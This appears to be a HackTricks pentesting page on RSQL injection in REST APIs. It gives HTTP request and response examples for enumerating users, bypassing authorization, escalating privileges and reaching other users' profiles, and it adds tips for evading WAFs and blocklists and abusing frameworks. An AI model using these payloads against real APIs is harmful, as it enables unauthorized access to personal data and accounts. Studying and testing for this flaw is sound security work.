@@ -1,0 +1,622 @@
+# RSQL Injection
+
+{{#include ../banners/hacktricks-training.md}}
+
+## What is RSQL?
+RSQL is a query language designed for parameterized filtering of inputs in RESTful APIs. Based on FIQL (Feed Item Query Language), originally specified by Mark Nottingham for querying Atom feeds, RSQL stands out for its simplicity and ability to express complex queries in a compact and URI-compliant way over HTTP. This makes it an excellent choice as a general query language for REST endpoint searching.<sup>[[1]](#references)</sup>
+
+## Overview
+RSQL injection occurs when an application exposes attacker-controlled RSQL filters without constraining the permitted fields, relations, and operators. Unlike [SQL injection](sql-injection/README.md) or [LDAP injection](ldap-injection.md), RSQL normally builds read filters rather than raw database statements; the typical impact is unauthorized data access, enumeration, or authorization bypass. Modification or deletion requires an application-specific endpoint that applies attacker-controlled filters to a mutation.<sup>[[1]](#references)</sup>
+
+## How does it work?
+RSQL allows you to build advanced queries in RESTful APIs, for example:
+```bash
+/products?filter=price>100;category==electronics
+```
+
+This translates to a structured query that filters products with price greater than 100 and category “electronics”.
+
+If the application does not correctly validate user input, an attacker could manipulate the filter to execute unexpected queries, such as:
+```bash
+/products?filter=id=in=(1,2,3);delete_all==true
+```
+An attacker can also extract sensitive information through Boolean query oracles and nested relationship filters.
+
+## Risks
+- **Exposure of sensitive data:** An attacker can retrieve information that should not be accessible.<sup>[[1]](#references)</sup>
+- **Data modification or deletion:** Possible when a mutation endpoint uses the injected filter to select records for update or deletion; filter injection alone is generally read-only.
+- **Privilege escalation:** Manipulation of identifiers that grant roles through filters to trick the application by accessing with privileges of other users.
+- **Evasion of access controls:** Manipulation of filters to access restricted data.
+- **Impersonation or IDOR:** Modification of identifiers between users through filters that allow access to information and resources of other users without being properly authenticated as such.
+
+## Supported RSQL operators
+| Operator  | Description | Example  |
+|:----: |:----: |:------------------:|
+| `;` / `and` | Logical **AND** operator. Filters rows where *both* conditions are *true* | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
+| `,` / `or` | Logical **OR** operator. Filters rows where *at least one* condition is *true*| `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
+| `==` | Performs an **equals** query. Returns all rows from *myTable* where values in *columnA* exactly equal *queryValue* | `/api/v2/myTable?q=columnA==queryValue` |
+| `=q=` | Performs a **search** query. Returns all rows from *myTable* where values in *columnA* contain *queryValue* | `/api/v2/myTable?q=columnA=q=queryValue` |
+| `=like=` | Performs a **like** query. Returns all rows from *myTable* where values in *columnA* are like *queryValue* | `/api/v2/myTable?q=columnA=like=queryValue` |
+| `=in=` | Performs an **in** query. Returns all rows from *myTable* where *columnA* contains *valueA* OR *valueB* | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
+| `=out=` | Performs an **exclude** query. Returns all rows of *myTable* where the values in *columnA* are neither *valueA* nor *valueB* | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
+| `!=` | Performs a *not equals* query. Returns all rows from *myTable* where values in *columnA* do not equal *queryValue* | `/api/v2/myTable?q=columnA!=queryValue` |
+| `=notlike=` | Performs a **not like** query. Returns all rows from *myTable* where values in *columnA* are not like *queryValue* | `/api/v2/myTable?q=columnA=notlike=queryValue` |
+| `<` & `=lt=` | Performs a **less-than** query. Returns rows where values in *columnA* are less than *queryValue* | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
+| `=le=` & `<=` | Performs a **less-than-or-equal** query. Returns rows where values in *columnA* are less than or equal to *queryValue* | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
+| `>` & `=gt=` | Performs a **greater than** query. Returns all rows from *myTable* where values in *columnA* are greater than *queryValue* | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
+| `>=` & `=ge=` | Performs a **equal** to or **greater than** query. Returns all rows from *myTable* where values in *columnA* are equal to or greater than *queryValue* | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
+| `=rng=` | Performs a **range** query. Returns rows where values in *columnA* are greater than or equal to *fromValue* and less than or equal to *toValue* | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |
+
+**Note**: Table based on information from [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) and [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>
+
+#### Examples
+- name=="Kill Bill";year=gt=2003
+- name=="Kill Bill" and year>2003
+- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
+- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
+- director.lastName==Nolan;year=ge=2000;year=lt=2010
+- director.lastName==Nolan and year>=2000 and year<2010
+- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
+- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino
+
+**Note**: Table based on information from [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.<sup>[[3]](#references)</sup>
+
+## Common filters
+These filters help refine queries in APIs:
+
+| Filter | Description | Example |
+|--------|------------|---------|
+| `filter[users]` | Filters results by specific users | `/api/v2/myTable?filter[users]=123` |
+| `filter[status]` | Filters by status (active/inactive, completed, etc.) | `/api/v2/orders?filter[status]=active` |
+| `filter[date]` | Filters results within a date range | `/api/v2/logs?filter[date]=gte:2024-01-01` |
+| `filter[category]` | Filters by category or resource type | `/api/v2/products?filter[category]=electronics` |
+| `filter[id]` | Filters by a unique identifier | `/api/v2/posts?filter[id]=42` |
+
+
+## Common parameters
+These parameters help optimize API responses:
+
+| Parameter | Description | Example |
+|-----------|------------|---------|
+| `include` | Includes related resources in the response | `/api/v2/orders?include=customer,items` |
+| `sort` | Sorts results in ascending or descending order | `/api/v2/users?sort=-created_at` |
+| `page[size]` | Controls the number of results per page | `/api/v2/products?page[size]=10` |
+| `page[number]` | Specifies the page number | `/api/v2/products?page[number]=2` |
+| `fields[resource]` | Defines which fields to return in the response | `/api/v2/users?fields[users]=id,name,email` |
+| `search` | Performs a more flexible search | `/api/v2/posts?search=technology` |
+
+## Information leakage and enumeration of users
+The following request shows a registration endpoint that requires the email parameter to check if there is any user registered with that email and return a true or false depending on whether or not it exists in the database:<sup>[[4]](#references)</sup>
+### Request
+```
+GET /api/registrations HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Origin: https://localhost:3000
+Connection: keep-alive
+Referer: https://localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 400 
+Date: Sat, 22 Mar 2025 14:47:14 GMT
+Content-Type: application/vnd.api+json
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+Content-Length: 85
+
+{
+    "errors": [{
+        "code": "BLANK",
+        "detail": "Missing required param: email",
+        "status": "400"
+    }]
+}
+```
+
+Although a `/api/registrations?email=<emailAccount>` is expected, it is possible to use RSQL filters to attempt to enumerate and/or extract user information through the use of special operators:
+### Request
+```
+GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Origin: https://locahost:3000
+Connection: keep-alive
+Referer: https://locahost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 200 
+Date: Sat, 22 Mar 2025 14:09:38 GMT
+Content-Type: application/vnd.api+json;charset=UTF-8
+Content-Length: 38
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+
+{
+    "data": {
+        "attributes": {
+            "tenants": []
+        }
+    }
+}
+```
+In the case of matching a valid email account, the application would return the user's information instead of a classic *“true”*, *"1"* or whatever in the response to the server:
+### Request
+```
+GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Origin: https://localhost:3000
+Connection: keep-alive
+Referer: https://localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 200 
+Date: Sat, 22 Mar 2025 14:19:46 GMT
+Content-Type: application/vnd.api+json;charset=UTF-8
+Content-Length: 293
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+
+{
+    "data": {
+        "id": "********************",
+        "type": "UserAccountDTO",
+        "attributes": {
+            "id": "********************",
+            "type": "UserAccountDTO",
+            "email": "manuel**********@domain.local",
+            "sub": "*********************",
+            "status": "ACTIVE",
+            "tenants": [{
+                "id": "1"
+            }]
+        }
+    }
+}
+```
+## Authorization evasion
+In this scenario, we start from a user with a basic role and in which we do not have privileged permissions (e.g. administrator) to access the list of all users registered in the database:<sup>[[4]](#references)</sup>
+### Request
+```
+GET /api/users HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Authorization: Bearer eyJhb.................
+Origin: https://localhost:3000
+Connection: keep-alive
+Referer: https://localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 403 
+Date: Sat, 22 Mar 2025 14:40:07 GMT
+Content-Length: 0
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+```
+
+Again we make use of the filters and special operators that will allow us an alternative way to obtain the information of the users and evading the access control.
+For example, filter by those *users* that contain the letter “*a*” in their user *ID*:
+### Request
+```
+GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Authorization: Bearer eyJhb.................
+Origin: https://localhost:3000
+Connection: keep-alive
+Referer: https://localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 200 
+Date: Sat, 22 Mar 2025 14:43:28 GMT
+Content-Type: application/vnd.api+json;charset=UTF-8
+Content-Length: 1434192
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+
+{
+    "data": [{
+        "id": "********A***********",
+        "type": "UserGetResponseCustomDTO",
+        "attributes": {
+            "status": "ACTIVE",
+            "countryId": 63,
+            "timeZoneId": 3,
+            "translationKey": "************",
+            "email": "**********@domain.local",
+            "firstName": "rafael",
+            "surname": "************",
+            "telephoneCountryCode": "**",
+            "mobilePhone": "*********",
+            "taxIdentifier": "********",
+            "languageId": 1,
+            "createdAt": "2024-08-09T10:57:41.237Z",
+            "termsOfUseAccepted": true,
+            "id": "******************",
+            "type": "UserGetResponseCustomDTO"
+        }
+    }, {
+        "id": "*A*******A*****A*******A******",
+        "type": "UserGetResponseCustomDTO",
+        "attributes": {
+            "status": "ACTIVE",
+            "countryId": 63,
+            "timeZoneId": 3,
+            "translationKey": ""************",
+            "email": "juan*******@domain.local",
+            "firstName": "juan",
+            "surname": ""************",",
+            "telephoneCountryCode": "**",
+            "mobilePhone": "************",
+            "taxIdentifier": "************",
+            "languageId": 1,
+            "createdAt": "2024-07-18T06:07:37.68Z",
+            "termsOfUseAccepted": true,
+            "id": "*******************",
+            "type": "UserGetResponseCustomDTO"
+        }
+    }, {
+        ................
+```
+
+## Privilege Escalation
+It is very likely to find certain endpoints that check user privileges through their role. For example, we are dealing with a user who has no privileges:<sup>[[4]](#references)</sup>
+### Request
+```
+GET /api/companyUsers?include=role HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Authorization: Bearer eyJhb......
+Origin: https://localhost:3000
+Connection: keep-alive
+Referer: https://localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 200 
+Date: Sat, 22 Mar 2025 19:13:08 GMT
+Content-Type: application/vnd.api+json;charset=UTF-8
+Content-Length: 11
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+
+{
+    "data": []
+}
+```
+
+Using certain operators we could enumerate administrator users:
+### Request
+```
+GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Authorization: Bearer eyJh.....
+Origin: https://localhost:3000
+Connection: keep-alive
+Referer: https://localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 200 
+Date: Sat, 22 Mar 2025 19:13:45 GMT
+Content-Type: application/vnd.api+json;charset=UTF-8
+Content-Length: 361
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+
+{
+    "data": [{
+        "type": "CompanyUserGetResponseDTO",
+        "attributes": {
+            "companyId": "FA**************",
+            "companyTaxIdentifier": "B999*******",
+            "bizName": "company sl",
+            "email": "jose*******@domain.local",
+            "userRole": {
+                "userRoleId": 1,
+                "userRoleKey": "general.roles.admin"
+            },
+            "companyCountryTranslationKey": "*******",
+            "type": "CompanyUserGetResponseDTO"
+        }
+    }]
+}
+```
+
+After knowing an identifier of an administrator user, it would be possible to exploit a privilege escalation by replacing or adding the corresponding filter with the administrator's identifier and getting the same privileges:
+### Request
+```
+GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Authorization: Bearer eyJ.....
+Origin: https:/localhost:3000
+Connection: keep-alive
+Referer: https:/localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 200 
+Date: Sat, 22 Mar 2025 18:53:00 GMT
+Content-Type: application/vnd.api+json;charset=UTF-8
+Content-Length: 68833
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+
+{
+    "meta": {
+        "Functionalities": [{
+            "functionalityId": 1,
+            "permissionId": 1,
+            "effectivePriority": "PERMIT",
+            "effectiveBehavior": "PERMIT",
+            "translationKey": "general.userProfile",
+            "type": "FunctionalityPermissionDTO"
+        }, {
+            "functionalityId": 2,
+            "permissionId": 2,
+            "effectivePriority": "PERMIT",
+            "effectiveBehavior": "PERMIT",
+            "translationKey": "general.my_profile",
+            "type": "FunctionalityPermissionDTO"
+        }, {
+            "functionalityId": 3,
+            "permissionId": 3,
+            "effectivePriority": "PERMIT",
+            "effectiveBehavior": "PERMIT",
+            "translationKey": "layout.change_user_data",
+            "type": "FunctionalityPermissionDTO"
+        }, {
+            "functionalityId": 4,
+            "permissionId": 4,
+            "effectivePriority": "PERMIT",
+            "effectiveBehavior": "PERMIT",
+            "translationKey": "general.configuration",
+            "type": "FunctionalityPermissionDTO"
+        }, {
+            ....
+        }]
+    }
+}
+```
+
+
+
+## Impersonate or Insecure Direct Object References (IDOR)
+Besides `filter`, parameters such as `include` may expose related resources or fields in the result (for example language, country, or password data).<sup>[[4]](#references)</sup>
+
+In the following example, the information of our user profile is shown:
+### Request
+```
+GET /api/users?include=language,country HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Authorization: Bearer eyJ...
+Origin: https://localhost:3000
+Connection: keep-alive
+Referer: https://localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 200 
+Date: Sat, 22 Mar 2025 19:47:27 GMT
+Content-Type: application/vnd.api+json;charset=UTF-8
+Content-Length: 540
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+
+{
+    "data": [{
+        "id": "D5********************",
+        "type": "UserGetResponseCustomDTO",
+        "attributes": {
+            "status": "ACTIVE",
+            "countryId": 63,
+            "timeZoneId": 3,
+            "translationKey": "**********",
+            "email": "domingo....@domain.local",
+            "firstName": "Domingo",
+            "surname": "**********",
+            "telephoneCountryCode": "**",
+            "mobilePhone": "******",
+            "languageId": 1,
+            "createdAt": "2024-03-11T07:24:57.627Z",
+            "termsOfUseAccepted": true,
+            "howMeetUs": "**************",
+            "id": "D5********************",
+            "type": "UserGetResponseCustomDTO"
+        }
+    }]
+}
+```
+
+The combination of filters can be used to evade authorization control and gain access to other users' profiles:
+### Request
+```
+GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
+Accept: application/vnd.api+json
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate, br, zstd
+Content-Type: application/vnd.api+json
+Authorization: Bearer eyJ...
+Origin: https://localhost:3000
+Connection: keep-alive
+Referer: https://localhost:3000/
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-site
+```
+### Response
+```
+HTTP/1.1 200 
+Date: Sat, 22 Mar 2025 19:50:07 GMT
+Content-Type: application/vnd.api+json;charset=UTF-8
+Content-Length: 520
+Connection: keep-alive
+Vary: Origin
+Vary: Access-Control-Request-Method
+Vary: Access-Control-Request-Headers
+Access-Control-Allow-Origin: *
+
+{
+    "data": [{
+        "id": "94******************",
+        "type": "UserGetResponseCustomDTO",
+        "attributes": {
+            "status": "ACTIVE",
+            "countryId": 63,
+            "timeZoneId": 2,
+            "translationKey": "**************",
+            "email": "jose******@domain.local",
+            "firstName": "jose",
+            "surname": "***************",
+            "telephoneCountryCode": "**",
+            "mobilePhone": "********",
+            "taxIdentifier": "*********",
+            "languageId": 1,
+            "createdAt": "2024-11-21T08:29:05.833Z",
+            "termsOfUseAccepted": true,
+            "id": "94******************",
+            "type": "UserGetResponseCustomDTO"
+        }
+    }]
+}
+```
+
+
+## Detection and Fuzzing Quick Wins
+- Check for RSQL support by sending harmless probes like `?filter=id==test`, `?q==test` or malformed operators `=foo=`; verbose APIs often leak parser errors ("Unknown operator" / "Unknown property").
+- `rsql-parser`-style grammars reserve `" ' ( ) ; , = ! ~ < >`; if a selector/value containing one of those characters only works once quoted (for example `name=='a,b'`), you have a useful fingerprint and a hint that input validation is happening on only part of the expression.
+- Don't stop at `filter[users]`: Elide-style JSON:API backends may accept both type-specific filters such as `filter[user]=role==admin` and a global `filter=authors.name=='Null Ned';title=='Life with Null Ned'` that traverses relationships.<sup>[[5]](#references)</sup>
+- Probe operator support to fingerprint the translator layer, not just the parser: `==*foo*`, `=ini=*foo*`, `=isnull=true`, `=isempty=true`, `=between=(1,10)` or `=hasmember=` usually reveal Elide/custom JPA translators with a much larger attack surface. In Elide 5+ the default FIQL behavior is case-sensitive, so comparing `name==admin` with `name=ini=*ADMIN*` is also a useful fingerprint.<sup>[[5]](#references)</sup>
+- Pull `/doc`, `/swagger` or the OpenAPI document when present. Elide documents filter parameters for each primitive attribute plus `include`, `sort` and pagination support, which is an easy way to recover valid selectors without brute-forcing field names.<sup>[[5]](#references)</sup>
+- Many implementations double-parse URL parameters; try double-encoding `(`, `)`, `*`, `;` (e.g., `%2528admin%2529`) to bypass naive blocklists and WAFs.
+- Boolean exfil with wildcards: `filter[users]=email==*%@example.com;status==ACTIVE` and flip logic with `,` (OR) to compare response sizes.
+- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` quickly enumerates by year without knowing exact IDs.
+
+## Framework-specific abuse (Elide / JPA Specification / JSON:API)
+- `rsql-parser` only parses the grammar and explicitly supports custom operators. If you see non-standard operators such as `=like=`, `=ilike=`, `=all=` or `=notAssigned=`, focus your review on the translation layer because that is where unsafe string concatenation usually appears.<sup>[[3]](#references)</sup>
+- Elide JSON:API supports both type-specific `filter[TYPE]` parameters and a single global `filter`, and selectors can traverse related models with dotted paths such as `author.books.price.total`. Test the same predicate on root collections and related collections because authorization bugs often exist on only one path.<sup>[[5]](#references)</sup>
+- `rsql-jpa-specification` supports public-to-internal property remapping (for example `compCode` -> `company.code`, `compId` -> `company.id`). If the UI or docs expose friendly aliases, fuzz both the alias and the canonical dotted path to discover hidden joins or allow-list gaps.<sup>[[6]](#references)</sup>
+- The same library documents direct SQL `LIKE` translation plus configurable escape characters. If the target exposes `=like=`-style operators, test `%`, `_` and the escape character because custom predicates often forget to escape wildcards consistently across MySQL/PostgreSQL/SQL Server.<sup>[[6]](#references)</sup>
+- Newer `rsql-jpa-specification` releases also support PostgreSQL `jsonb` traversal (`data.user.id==1`, `data.roles.id==1`) and optional stored-procedure syntax such as `@upper[code]==HELLO` when procedures are whitelisted. If an API exposes either feature, you can often pivot from a simple field filter into nested JSON documents or function-backed selectors that were never meant to be attacker reachable.<sup>[[6]](#references)</sup>
+- Elide analytic queries added field arguments/parameterized columns to the RSQL grammar; this was the precondition behind CVE-2022-24827, where a `TEXT` parameter containing `--` could strip the generated authorization `WHERE` clause. On analytics endpoints, always test whether filter operands or field arguments are copied into SQL fragments before server-side auth filters are applied.<sup>[[7]](#references)</sup>
+
+## Automation helpers
+- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` validates payloads locally and shows the abstract syntax tree—useful to craft balanced parentheses and custom operators.
+- **Python quick builder**: 
+```python
+from pyrsql import RSQL
+payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
+print(str(payload))
+```
+- Pair with HTTP fuzzer (ffuf, turbo-intruder) by iterating wildcard positions `*a*`, `*e*`, etc., inside `=in=` lists to enumerate IDs and emails quickly.
+
+## References
+- [1] [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
+- [2] [MOLGENIS documentation](https://molgenis.gitbooks.io/molgenis/content/)
+- [3] [rsql-parser](https://github.com/jirutka/rsql-parser)
+- [4] [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
+- [5] [Elide JSON:API filtering](https://elide.io/pages/guide/v7/10-jsonapi.html)
+- [6] [rsql-jpa-specification](https://github.com/perplexhub/rsql-jpa-specification)
+- [7] [Elide SQL Injection Security Advisory (CVE-2022-24827) - GHSA-8xpj-9j9g-fc9r](https://github.com/yahoo/elide/security/advisories/GHSA-8xpj-9j9g-fc9r)
+
+{{#include ../banners/hacktricks-training.md}}
